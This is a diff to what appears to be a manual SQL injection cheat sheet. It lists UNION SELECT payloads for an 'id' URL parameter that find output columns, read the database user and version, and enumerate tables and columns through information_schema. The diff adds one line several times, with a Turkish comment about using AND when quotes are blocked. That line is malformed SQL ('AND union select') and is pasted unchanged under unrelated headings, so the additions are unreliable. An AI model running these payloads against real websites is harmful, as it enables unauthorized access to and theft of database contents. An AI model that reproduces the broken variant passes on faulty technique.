@@ -42,15 +42,22 @@ Manual sql injection commands
 
 # Find space to output db
 ?id=1 union select 1,2,3,4,5,6,7,8,9 -- -
+?id=1 AND union select 1,2,3,4,user(),6,7,8,9 -- - -> eğer tırnak koyamıyorsak AND querysini kullanabiliriz.
+
 
 # Get username of the sql-user
 ?id=1 union select 1,2,3,4,user(),6,7,8,9 -- -
+?id=1 AND union select 1,2,3,4,user(),6,7,8,9 -- - -> eğer tırnak koyamıyorsak AND querysini kullanabiliriz.
+
 
 # Get version
 ?id=1 union select 1,2,3,4,version(),6,7,8,9 -- -
+?id=1 AND union select 1,2,3,4,user(),6,7,8,9 -- - -> eğer tırnak koyamıyorsak AND querysini kullanabiliriz.
 
 # Get all tables
 ?id=1 union select 1,2,3,4,concat(table_name),6,7,8,9 from information_schema.tables where table_schema=database() -- -
+?id=1 AND union select 1,2,3,4,user(),6,7,8,9 -- - -> eğer tırnak koyamıyorsak AND querysini kullanabiliriz.
+
 
 # Get all columns from a specific table
 ?id=1 union select 1,2,3,4,concat(column_name),6,7,8,9 from information_schema.columns where table_name = 'users' -- -
